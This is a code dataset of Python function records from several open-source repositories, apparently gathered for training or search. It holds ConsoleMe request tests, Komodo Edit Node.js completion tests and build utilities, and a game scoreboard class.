{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_request_by_id_no_match(self, mock_auth, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_request_by_id\n\nmock_user = \"cnorris\"\nmock_requests = []\nmock_secondary_approver = [\"group1\"]\nmock_user_dynamo_handler.return_value.resolve_request_ids.return_value = (\n    mock_requests\n)\n\nmock_sa = Future()\nmock_sa.set_result(mock_secondary_approver)\nmock_auth.get_secondary_approvers.return_value = mock_sa\n\nrequests = asyncio.get_event_loop().run_until_complete(\n    get_request_by_id(mock_user, \"123456\")\n)\nself.assertEqual(\n    requests, None, \"None should be returned when there is no match\"\n)", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_request_by_id_failure(self, mock_auth, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_request_by_id\n\nmock_user = \"cnorris\"\nmock_requests = NoMatchingRequest(\"foo\")\nmock_secondary_approver = [\"group1\"]\nmock_user_dynamo_handler.return_value.resolve_request_ids.side_effect = (\n    mock_requests\n)\n\nmock_sa = Future()\nmock_sa.set_result(mock_secondary_approver)\nmock_auth.get_secondary_approvers.return_value = mock_sa\n\nrequests = asyncio.get_event_loop().run_until_complete(\n    get_request_by_id(mock_user, \"123456\")\n)\nself.assertEqual(\n    requests, None, \"None should be returned when there is no match\"\n)", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked S3 Fixture.\"\"\"\n", "func_signal": "def sns(aws_credentials):\n", "code": "with mock_sns():\n    yield boto3.client(\"sns\", region_name=\"us-east-1\")", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked S3 Fixture.\"\"\"\n", "func_signal": "def s3(aws_credentials):\n", "code": "with mock_s3():\n    yield boto3.client(\"s3\", region_name=\"us-east-1\")", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "# Create the table:\n", "func_signal": "def requests_table(dynamodb):\n", "code": "dynamodb.create_table(\n    TableName=\"consoleme_requests_global\",\n    AttributeDefinitions=[{\"AttributeName\": \"request_id\", \"AttributeType\": \"S\"}],\n    KeySchema=[{\"AttributeName\": \"request_id\", \"KeyType\": \"HASH\"}],\n    ProvisionedThroughput={\"ReadCapacityUnits\": 1000, \"WriteCapacityUnits\": 1000},\n)\n\nyield dynamodb", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"\nTest exporting via module.exports\n\"\"\"\n", "func_signal": "def test_require_module_exports(self):\n", "code": "manifest = {\n    \"test.js\": \"\"\"\n        require('./dummy').<1>;\n        \"\"\",\n    \"dummy.js\": \"\"\"\n        module.exports = {\n            method: function() {}\n        };\n        \"\"\",\n}\nbuf, positions = write_files(self, manifest=manifest, name=\"require_module_exports\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"method\"), ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest require() on a module using package.json\n\"\"\"\n", "func_signal": "def test_module_package_manifest(self):\n", "code": "manifest = {\n    \"test.js\": \"\"\"\n        require('simple').<1>;\n        \"\"\",\n    \"node_modules/simple/package.json\": \"\"\"\n        {\n            \"foopy\": \"pants\",\n            \"main\": \"./lib/file.js\",\n            \"name\": \"sillypants\"\n        }\n        \"\"\",\n    \"node_modules/simple/lib/file.js\": \"\"\"\n        exports = {\n            method: function() {}\n        };\n        \"\"\",\n}\nbuf, positions = write_files(self, manifest=manifest, name=\"module_package_manifest\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"method\"), ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js repl module\n\"\"\"\n", "func_signal": "def test_repl(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    repl = require('repl');\n    repl.<1>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"repl\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"start\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Run the given command.\n\n    \"cmd\" is the command to run\n    \"logstream\" is an optional logging stream on which to log the \n        command. If None, no logging is done. If unspecifed, this \n        looks for a Logger instance named 'log' and logs the command \n        on log.debug().\n\nRaises OSError is the command returns a non-zero exit status.\n\"\"\"\n", "func_signal": "def run(cmd, logstream=_RUN_DEFAULT_LOGSTREAM, dry_run=False):\n", "code": "__run_log(logstream, \"running '%s'\", cmd)\nif dry_run:\n    return\nfixed_cmd = cmd\nif sys.platform == \"win32\" and cmd.count('\"') > 2:\n    fixed_cmd = '\"' + cmd + '\"'\nretval = os.system(fixed_cmd)\nif hasattr(os, \"WEXITSTATUS\"):\n    status = os.WEXITSTATUS(retval)\nelse:\n    status = retval\nif status:\n    #TODO: add std OSError attributes or pick more approp. exception\n    raise OSError(\"error running '%s': %r\" % (cmd, status))", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Join the given version-tuple, inserting '.' as appropriate.\n\n@param pad_zeros {int} is a number of numeric parts before any\n    \"quality\" letter (e.g. 'a' for alpha).\n\n>>> join_short_ver( ('4', '1', '0') )\n'4.1.0'\n>>> join_short_ver( ('1', '3', 'a', '2') )\n'1.3a2'\n>>> join_short_ver(('1', '3', 'a', '2'), pad_zeros=3)\n'1.3.0a2'\n>>> join_short_ver(('1', '3'), pad_zeros=3)\n'1.3.0'\n\"\"\"\n", "func_signal": "def join_short_ver(ver_tuple, pad_zeros=None):\n", "code": "def isint(s):\n    try:\n        int(s)\n    except ValueError:\n        return False\n    else:\n        return True\n\nif pad_zeros:\n    bits = []\n    hit_quality_bit = False\n    for bit in ver_tuple:\n        if not hit_quality_bit and not isint(bit):\n            hit_quality_bit = True\n            while len(bits) < pad_zeros:\n                bits.append(0)\n        bits.append(bit)\n    if not hit_quality_bit:\n        while len(bits) < pad_zeros:\n            bits.append(0)\nelse:\n    bits = ver_tuple\n\ndotted = []\nfor bit in bits:\n    if dotted and isint(dotted[-1]) and isint(bit):\n        dotted.append('.')\n    dotted.append(str(bit))\nreturn ''.join(dotted)", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js domain module\n\"\"\"\n", "func_signal": "def test_domain(self):\n", "code": "if not self.version >= \"0.8\":\n    raise TestSkipped(\"Node.js version %s not at least 0.8\" % (self.version,))\nmanifest = {\"test.js\": \"\"\"\n    domain = require('domain');\n    domain.<1>;\n    domain.create().<2>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"dgram\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"create\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"run\"),\n     (\"variable\", \"members\"),\n     (\"function\", \"add\"),\n     (\"function\", \"remove\"),\n     (\"function\", \"bind\"),\n     (\"function\", \"intercept\"),\n     (\"function\", \"dispose\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js fs module\n\"\"\"\n", "func_signal": "def test_fs(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    require('fs').<1>;\n    require('fs').statSync(\"/tmp\").<2>;\n    require('fs').createReadStream(\"/tmp/foofoo\").<3>;\n    require('fs').createWriteStream(\"/tmp/foofoo\").<4>;\n    require('fs').watch(\"/tmp/pants\").<5>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"fs\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"rename\"),\n     (\"function\", \"renameSync\"),\n     (\"function\", \"truncate\"),\n     (\"function\", \"truncateSync\"),\n     (\"function\", \"chown\"),\n     (\"function\", \"chownSync\"),\n     (\"function\", \"fchown\"),\n     (\"function\", \"fchownSync\"),\n     (\"function\", \"lchown\"),\n     (\"function\", \"lchownSync\"),\n     (\"function\", \"chmod\"),\n     (\"function\", \"chmodSync\"),\n     (\"function\", \"fchmod\"),\n     (\"function\", \"fchmodSync\"),\n     (\"function\", \"lchmod\"),\n     (\"function\", \"lchmodSync\"),\n     (\"function\", \"stat\"),\n     (\"function\", \"lstat\"),\n     (\"function\", \"fstat\"),\n     (\"function\", \"statSync\"),\n     (\"function\", \"lstatSync\"),\n     (\"function\", \"fstatSync\"),\n     (\"function\", \"link\"),\n     (\"function\", \"linkSync\"),\n     (\"function\", \"symlink\"),\n     (\"function\", \"symlinkSync\"),\n     (\"function\", \"readlink\"),\n     (\"function\", \"readlinkSync\"),\n     (\"function\", \"realpath\"),\n     (\"function\", \"realpathSync\"),\n     (\"function\", \"unlink\"),\n     (\"function\", \"unlinkSync\"),\n     (\"function\", \"rmdir\"),\n     (\"function\", \"rmdirSync\"),\n     (\"function\", \"mkdir\"),\n     (\"function\", \"mkdirSync\"),\n     (\"function\", \"readdir\"),\n     (\"function\", \"readdirSync\"),\n     (\"function\", \"close\"),\n     (\"function\", \"closeSync\"),\n     (\"function\", \"open\"),\n     (\"function\", \"openSync\"),\n     (\"function\", \"utimes\"),\n     (\"function\", \"utimesSync\"),\n     (\"function\", \"futimes\"),\n     (\"function\", \"futimesSync\"),\n     (\"function\", \"fsync\"),\n     (\"function\", \"fsyncSync\"),\n     (\"function\", \"write\"),\n     (\"function\", \"writeSync\"),\n     (\"function\", \"read\"),\n     (\"function\", \"readSync\"),\n     (\"function\", \"readFile\"),\n     (\"function\", \"readFileSync\"),\n     (\"function\", \"writeFile\"),\n     (\"function\", \"writeFileSync\"),\n     (\"function\", \"appendFile\", \">= 0.8\"),\n     (\"function\", \"appendFileSync\", \">= 0.8\"),\n     (\"function\", \"watchFile\"),\n     (\"function\", \"unwatchFile\"),\n     (\"function\", \"watch\", \">= 0.8\"),\n     (\"function\", \"exists\", \">= 0.8\"),\n     (\"function\", \"existsSync\", \">= 0.8\"),\n     (\"function\", \"createReadStream\"),\n     (\"function\", \"createWriteStream\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"isFile\"),\n     (\"function\", \"isDirectory\"),\n     (\"function\", \"isBlockDevice\"),\n     (\"function\", \"isCharacterDevice\"),\n     (\"function\", \"isSymbolicLink\"),\n     (\"function\", \"isFIFO\"),\n     (\"function\", \"isSocket\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[3],\n    # this is actually from the 'streams' module, which is untestable\n    [(\"function\", \"addListener\"), # from EventEmitter\n     (\"function\", \"on\"),          # from EventEmitter\n     (\"variable\", \"readable\"),\n     (\"function\", \"setEncoding\"),\n     (\"function\", \"pause\"),\n     (\"function\", \"resume\"),\n     (\"function\", \"destroy\"),\n     (\"function\", \"destroySoon\", \">= 0.6 and < 0.7\"),\n     (\"function\", \"pipe\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[4],\n    # this is actually from the 'streams' module, which is untestable\n    [(\"function\", \"addListener\"), # from EventEmitter\n     (\"function\", \"on\"),          # from EventEmitter\n     (\"variable\", \"writable\"),\n     (\"function\", \"write\"),\n     (\"function\", \"end\"),\n     (\"function\", \"destroy\"),\n     (\"function\", \"destroySoon\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[5],\n    [(\"function\", \"close\"),\n     (\"function\", \"on\"), # EventEmitter\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nOverride CodeIntelTestCase.assertCompletionsInclude2 to support versions\nThis is same as the original, except the completions can have an\noptional third argument, a {str} that is the condition, e.g.\n\">= 0.8\" or \">= 0.6 and < 0.7\"\n(currently, only comparison operators and \"and\" are supported)\n\"\"\"\n", "func_signal": "def assertCompletionsInclude2(self, buf, pos, completions, implicit=True):\n", "code": "cplns = []\nfor cpln in completions:\n    if len(cpln) > 2:\n        condition = cpln[2]\n        tokens = condition.split()\n        comp = {\"<\":  operator.lt,\n                \"<=\": operator.le,\n                \">\":  operator.gt,\n                \">=\": operator.ge,\n                \"==\": operator.eq,\n                \"!=\": operator.ne,\n               }\n        i = 0\n        match = True\n        while i < len(tokens):\n            try:\n                if tokens[i] in comp:\n                    if not comp.get(tokens[i])(self.version, tokens[i + 1]):\n                        match = False\n                        break\n                    i += 1 # skip the version\n                    continue\n                assert tokens[i] == \"and\", \\\n                    \"Can't parse condition %s\" % (condition,)\n            finally:\n                i += 1\n        if not match:\n            continue\n    cplns.append((cpln[0], cpln[1]))\nreturn super(StdLibTestCase, self).assertCompletionsInclude2(\n    buf, pos, cplns, implicit)", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nCheck that require() works for relative paths\n\"\"\"\n", "func_signal": "def test_require(self):\n", "code": "manifest = {\n    \"http.js\": \"\"\"\n        /* as generated by node_html_to_js.py */\n        var http_ = {};\n        http_.Server = function Server() {}\n        http_.Server.prototype = {}\n        /**\n         * Start a UNIX socket server listening for connections on the given path.\n         */\n        http_.Server.prototype.listen = function() {}\n        exports = http_;\n        \"\"\",\n    \"fs.js\": \"\"\"\n        /* possible alternative for manually written files */\n        exports = {\n            rename: function() {}\n        }\n    \"\"\",\n    \"test.js\": \"\"\"\n        var my_http = require('./http');\n        var my_fs = require('./fs');\n        my_http.<1>;\n        my_fs.<2>;\n        \"\"\",\n}\nbuf, positions = write_files(self, manifest=manifest, name=\"require\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"class\", \"Server\"), ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"rename\"), ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js stream module\n\"\"\"\n", "func_signal": "def test_stream(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    var stream = require('stream');\n    stream.<1>;\n    var readStream = new stream.ReadableStream();\n    readStream.<2>;\n    var writeStream = new stream.WritableStream();\n    writeStream.<3>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"buffer\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"class\", \"ReadableStream\"),\n     (\"class\", \"WritableStream\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"on\"), # from EventEmitter\n     (\"variable\", \"readable\"),\n     (\"function\", \"setEncoding\"),\n     (\"function\", \"pause\"),\n     (\"function\", \"resume\"),\n     (\"function\", \"destroy\"),\n     (\"function\", \"destroySoon\", \">= 0.6 and < 0.7\"),\n     (\"function\", \"pipe\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[3],\n    [(\"function\", \"on\"), # from EventEmitter\n     (\"variable\", \"writable\"),\n     (\"function\", \"write\"),\n     (\"function\", \"end\"),\n     (\"function\", \"destroy\"),\n     (\"function\", \"destroySoon\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js cluster module\n\"\"\"\n", "func_signal": "def test_cluster(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    require('cluster').<1>;\n    new require('cluster').Worker().<2>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"tty\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"variable\", \"settings\", \">= 0.8\"),\n     (\"variable\", \"isMaster\"),\n     (\"variable\", \"isWorker\"),\n     (\"function\", \"setupMaster\", \">= 0.8\"),\n     (\"function\", \"fork\"),\n     (\"function\", \"disconnect\", \">= 0.8\"),\n     (\"variable\", \"workers\", \">= 0.8\"),\n     #(\"function\", \"on\"), # EventEmitter, broken due to bug 78596\n    ])\nif self.version >= \"0.8\":\n    self.assertCompletionsInclude2(buf, positions[2],\n        [(\"variable\", \"id\"),\n         (\"variable\", \"process\"),\n         (\"variable\", \"suicide\"),\n         (\"function\", \"send\"),\n         (\"function\", \"destroy\"),\n         (\"function\", \"disconnect\"),\n         (\"function\", \"on\"), # EventEmitter\n        ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Split a full version string to component bits.\n\n>>> split_full_ver('4.0.0-alpha3-12345')\n(4, 0, 0, 'alpha', 3, 12345)\n>>> split_full_ver('4.1.0-beta-12345')\n(4, 1, 0, 'beta', None, 12345)\n>>> split_full_ver('4.1.0-12345')\n(4, 1, 0, None, None, 12345)\n>>> split_full_ver('4.1-12345')\n(4, 1, 0, None, None, 12345)\n>>> split_full_ver('4.3.0')\n(4, 3, 0, None, None, None)\n\"\"\"\n", "func_signal": "def split_full_ver(ver_str):\n", "code": "def _isalpha(ch):\n    return 'a' <= ch <= 'z' or 'A' <= ch <= 'Z'\ndef _isdigit(ch):\n    return '0' <= ch <= '9'\ndef split_quality(s):\n    for i in reversed(range(1, len(s)+1)):\n        if not _isdigit(s[i-1]):\n            break\n    if i == len(s):\n        quality, quality_num = s, None\n    else:\n        quality, quality_num = s[:i], int(s[i:])\n    return quality, quality_num\n\nbits = []\nfor i, undashed in enumerate(ver_str.split('-')):\n    for undotted in undashed.split('.'):\n        if len(bits) == 3:\n            # This is the \"quality\" section: 2 bits\n            if _isalpha(undotted[0]):\n                bits += list(split_quality(undotted))\n                continue\n            else:\n                bits += [None, None]\n        try:\n            bits.append(int(undotted))\n        except ValueError:\n            bits.append(undotted)\n    # After first undashed segment should have: (major, minor, patch)\n    if i == 0:\n        while len(bits) < 3:\n            bits.append(0)\n\nwhile len(bits) < 6:\n    bits.append(None)\n\nreturn tuple(bits)", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Return a tuple of (dirnames, filenames) for the remote dir.\n\nThis presumes a GNU-like `ls` on the remote machine.\n\"\"\"\n", "func_signal": "def remote_listdir(rdir, log=None):\n", "code": "login, dir = rdir.split(':', 1)\nnorm_login = login\nif sys.platform == \"win32\":\n    if '@' not in login:\n        norm_login = \"%s@%s\" % (getpass.getuser(), login)\n    argv = [\"plink\", \"-batch\", norm_login, \"ls\", \"-aF\", dir]\nelse:\n    argv = [\"ssh\", \"-o\", \"BatchMode=yes\", norm_login, \"ls\", \"-aF\", dir]\nif log:\n    log(' '.join(argv))\np = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\ndnames = []\nfnames = []\nfor name in p.stdout.read().splitlines(0):\n    sigil = \"\"\n    if name[-1] in \"*/=>@|\":\n        name, sigil = name[:-1], name[-1]\n    if name in ('.', '..'):\n        continue\n    if sigil == '/':\n        dnames.append(name)\n    else:\n        fnames.append(name)\nreturn dnames, fnames", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js events module\n\"\"\"\n", "func_signal": "def test_events(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    var events = require('events');\n    events.<1>;\n    var emitter = new events.EventEmitter();\n    emitter.<2>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"events\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"class\", \"EventEmitter\")])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"addListener\"),\n     (\"function\", \"on\"),\n     (\"function\", \"once\"),\n     (\"function\", \"removeListener\"),\n     (\"function\", \"removeAllListeners\"),\n     (\"function\", \"setMaxListeners\"),\n     (\"function\", \"listeners\"),\n     (\"function\", \"emit\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Like os.walk(dir), but for a remote dir.\n\nThis presumes a GNU-like `ls` on the remote machine.\n\"\"\"\n", "func_signal": "def remote_walk(rdir, log=None):\n", "code": "from posixpath import join\n\nlogin, dir = rdir.split(':', 1)\ndirs = [dir]\nwhile dirs:\n    dpath = dirs.pop(0)\n    dnames, fnames = remote_listdir(login + \":\" + dpath)\n    yield login+\":\"+dpath, dnames, fnames\n    dirs += [join(dpath, n) for n in dnames]", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"_dedent(text, tabsize=8, skip_first_line=False) -> dedented text\n\n    \"text\" is the text to dedent.\n    \"tabsize\" is the tab width to use for indent width calculations.\n    \"skip_first_line\" is a boolean indicating if the first line should\n        be skipped for calculating the indent width and for dedenting.\n        This is sometimes useful for docstrings and similar.\n\ntextwrap.dedent(s), but don't expand tabs to spaces\n\"\"\"\n", "func_signal": "def dedent(text, tabsize=8, skip_first_line=False):\n", "code": "lines = text.splitlines(1)\n_dedentlines(lines, tabsize=tabsize, skip_first_line=skip_first_line)\nreturn ''.join(lines)", "path": "KomodoEdit/util/buildutils.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js readline module\n\"\"\"\n", "func_signal": "def test_readline(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    require('readline').<1>;\n    require('readline').createInterface().<2>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"querystring\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"createInterface\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"on\"), # inherited from events.EventEmitter\n     (\"function\", \"setPrompt\"),\n     (\"function\", \"prompt\"),\n     (\"function\", \"question\"),\n     (\"function\", \"close\"),\n     (\"function\", \"pause\"),\n     (\"function\", \"resume\"),\n     (\"function\", \"write\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js timers module\n\"\"\"\n", "func_signal": "def test_timers(self):\n", "code": "manifest = {\"test.js\": \"require('timers').<1>;\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"timers\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"setTimeout\"),\n     (\"function\", \"clearTimeout\"),\n     (\"function\", \"setInterval\"),\n     (\"function\", \"clearInterval\"),\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js process module\n\"\"\"\n", "func_signal": "def test_process(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    process.<1>;\n    process.stdin.<2>;\n    process.stdout.<3>;\n    process.stderr.<4>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"process\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"variable\", \"stdout\"),\n     (\"variable\", \"stderr\"),\n     (\"variable\", \"stdin\"),\n     (\"variable\", \"argv\"),\n     (\"variable\", \"execPath\"),\n     (\"function\", \"abort\", \">= 0.8\"),\n     (\"function\", \"chdir\"),\n     (\"function\", \"cwd\"),\n     (\"variable\", \"env\"),\n     (\"function\", \"exit\"),\n     (\"function\", \"getgid\"),\n     (\"function\", \"setgid\"),\n     (\"function\", \"getuid\"),\n     (\"function\", \"setuid\"),\n     (\"variable\", \"version\"),\n     (\"variable\", \"versions\"),\n     (\"variable\", \"installPrefix\", \">= 0.6 and < 0.7\"),\n     (\"variable\", \"config\", \">= 0.8\"),\n     (\"function\", \"kill\"),\n     (\"variable\", \"pid\"),\n     (\"variable\", \"title\"),\n     (\"variable\", \"arch\"),\n     (\"variable\", \"platform\"),\n     (\"function\", \"memoryUsage\"),\n     (\"function\", \"nextTick\"),\n     (\"function\", \"umask\"),\n     (\"function\", \"uptime\"),\n     (\"function\", \"hrtime\", \">= 0.8\"),\n    ])\n\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"variable\", \"isRaw\", \">= 0.8\"),        # tty.ReadStream\n     (\"function\", \"setRawMode\", \">= 0.8\"),   # tty.ReadStream\n     (\"function\", \"setKeepAlive\", \">= 0.8\"), # net.Socket\n     (\"function\", \"pipe\"),                   # stream.ReadStream\n     (\"function\", \"on\"),                     # EventEmitter\n    ])\nself.assertCompletionsInclude2(buf, positions[3],\n    [(\"variable\", \"columns\", \">= 0.8\"),      # tty.WriteStream\n     (\"variable\", \"rows\", \">= 0.8\"),         # tty.WriteStream\n     (\"function\", \"setKeepAlive\", \">= 0.8\"), # net.Socket\n     (\"function\", \"write\"),                  # stream.WriteStream\n     (\"function\", \"on\"),                     # EventEmitter\n    ])\nself.assertCompletionsInclude2(buf, positions[4],\n    [(\"function\", \"write\")])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"\nTest the Node.js https module\n\"\"\"\n", "func_signal": "def test_https(self):\n", "code": "manifest = {\"test.js\": \"\"\"\n    require('https').<1>;\n    require('https').createServer().<2>;\n    require('https').request().<3>;\n    require('https').get().<4>;\n    require('https').globalAgent.<5>;\n    \"\"\"}\nbuf, positions = write_files(self, manifest=manifest, name=\"https\")\nself.assertCompletionsInclude2(buf, positions[1],\n    [(\"function\", \"createServer\"),\n     (\"function\", \"request\"),\n     (\"function\", \"get\"),\n     (\"class\", \"Agent\"),\n     (\"variable\", \"globalAgent\"),\n    ])\nself.assertCompletionsInclude2(buf, positions[2],\n    [(\"function\", \"on\"), # inherited from EventEmitter\n     (\"function\", \"listen\"), # inherited from tls.Server\n    ])\nfor pos in 3, 4:\n    self.assertCompletionsInclude2(buf, positions[pos],\n        [(\"function\", \"on\"), # inherited from EventEmitter\n         (\"function\", \"write\"),\n         (\"function\", \"end\"),\n         (\"function\", \"abort\"),\n        ])\nself.assertCompletionsInclude2(buf, positions[5],\n    [(\"variable\", \"maxSockets\"), # inherited from http.Agent\n    ])", "path": "KomodoEdit/src/codeintel/test2/test_nodejs.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "Komodo/KomodoEdit", "stars": 2134, "license": "other", "language": "python", "size": 501524}
{"docstring": "\"\"\"Draw score to the screen.\"\"\"\n", "func_signal": "def show_score(self):\n", "code": "self.screen.blit(self.score_image, self.score_rect)\nself.screen.blit(self.high_score_image, self.high_score_rect)\nself.screen.blit(self.level_image, self.level_rect)\n# Draw ships.\nself.ships.draw(self.screen)", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Show how many ships are left.\"\"\"\n", "func_signal": "def prep_ships(self):\n", "code": "self.ships = Group()\nfor ship_number in range(self.stats.ships_left):\n    ship = Ship(self.ai_settings, self.screen)\n    ship.rect.x = 10 + ship_number * ship.rect.width\n    ship.rect.y = 10\n    self.ships.add(ship)", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
